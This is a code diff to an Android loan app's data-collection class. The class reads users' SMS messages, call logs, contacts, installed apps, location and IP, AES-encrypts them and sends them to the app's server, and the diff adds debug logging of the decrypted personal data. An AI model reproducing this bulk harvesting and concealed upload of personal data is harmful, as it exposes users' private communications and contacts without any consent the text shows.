@@ -13,10 +13,12 @@ import com.blankj.utilcode.util.ThreadUtils.SimpleTask
 import com.loan.icreditapp.BuildConfig
 import com.loan.icreditapp.api.Api
 import com.loan.icreditapp.collect.bean.AppInfoRequest
+import com.loan.icreditapp.collect.bean.CallRecordRequest
 import com.loan.icreditapp.collect.bean.ContactRequest
 import com.loan.icreditapp.collect.bean.SmsRequest
 import com.loan.icreditapp.global.Constant
 import com.loan.icreditapp.util.BuildRequestJsonUtils
+import com.loan.icreditapp.util.EncodeUtils
 import com.lzy.okgo.OkGo
 import com.lzy.okgo.callback.StringCallback
 import com.lzy.okgo.model.Response
@@ -38,11 +40,11 @@ class CollectDataMgr {
         ThreadUtils.executeByCached(object : SimpleTask<Any?>() {
             @Throws(Throwable::class)
             override fun doInBackground(): Any {
-                val smsStr = GsonUtils.toJson(readSms(context))
-                val callRecordStr = readCallRecord(context)
-                val contractStr = GsonUtils.toJson(readContract(context))
-                val appInfoStr = GsonUtils.toJson(readAllAppInfo())
-                val locationBean = GsonUtils.toJson(LocationMgr.getInstance().locationBean)
+                val smsStr = EncodeUtils.encryptAES(GsonUtils.toJson(readSms(context)))
+                val callRecordStr = EncodeUtils.encryptAES(GsonUtils.toJson(readCallRecord(context)))
+                val contractStr = EncodeUtils.encryptAES(GsonUtils.toJson(readContract(context)))
+                val appInfoStr = EncodeUtils.encryptAES(GsonUtils.toJson(readAllAppInfo()))
+                val locationBean = EncodeUtils.encryptAES(GsonUtils.toJson(LocationMgr.getInstance().locationBean))
                 val jsonObject = buildRequestJsonObj(smsStr, callRecordStr, contractStr,
                     appInfoStr, locationBean, orderId)
                 getAuthData(jsonObject, observer)
@@ -61,6 +63,12 @@ class CollectDataMgr {
                                     contractStr: String, appListStr: String,
                                     locationStr: String, orderId: String): JSONObject {
         val jsonObject: JSONObject = BuildRequestJsonUtils.buildRequestJson()
+        if (BuildConfig.DEBUG){
+            Log.i("okhttp","1 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(contractStr) + "")
+            Log.i("okhttp","2 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(smsStr) + "")
+            Log.i("okhttp","3 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(callRecordStr) + "")
+            Log.i("okhttp","4 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(appListStr) + "")
+        }
         try {
             jsonObject.put("accountId", Constant.mAccountId)
             //申请订单ID
@@ -74,7 +82,8 @@ class CollectDataMgr {
             //app安装列表json
             jsonObject.put("appList", appListStr)
             //GPS位置json
-            jsonObject.put("gps", locationStr)
+            jsonObject.put("gps", "")
+//            jsonObject.put("gps", locationStr)
             //网络IP
             jsonObject.put("userIp", NetworkUtils.getIPAddress(true))
             //公网IP
@@ -139,8 +148,8 @@ class CollectDataMgr {
         return list
     }
 
-    private fun readCallRecord(context: Context): String {
-        val callRecordContent = StringBuffer()
+    private fun readCallRecord(context: Context): ArrayList<CallRecordRequest> {
+        val callRecordList = ArrayList<CallRecordRequest>()
         val cr = context.contentResolver
         val uri = CallLog.Calls.CONTENT_URI
         val projection = arrayOf(
@@ -154,9 +163,7 @@ class CollectDataMgr {
                 val number = cursor.getString(0)
                 val date = cursor.getLong(1)
                 val type = cursor.getInt(2)
-                callRecordContent.append("num ").append(number)
-                    .append("date ").append(date)
-                    .append(type).append(type)
+                callRecordList.add(CallRecordRequest(number, date, type))
             }
         } catch (e: Exception) {
             e.printStackTrace()
@@ -164,7 +171,7 @@ class CollectDataMgr {
         } finally {
             cursor?.close()
         }
-        return callRecordContent.toString()
+        return callRecordList
     }
 
     @SuppressLint("Range")
@@ -204,7 +211,7 @@ class CollectDataMgr {
         return list
     }
 
-    private fun readAllAppInfo(): ArrayList<AppInfoRequest>? {
+    private fun readAllAppInfo(): ArrayList<AppInfoRequest> {
         val list: ArrayList<AppInfoRequest> = ArrayList<AppInfoRequest>()
         val pm = Utils.getApp().packageManager ?: return list
         val installedPackages = pm.getInstalledPackages(0)
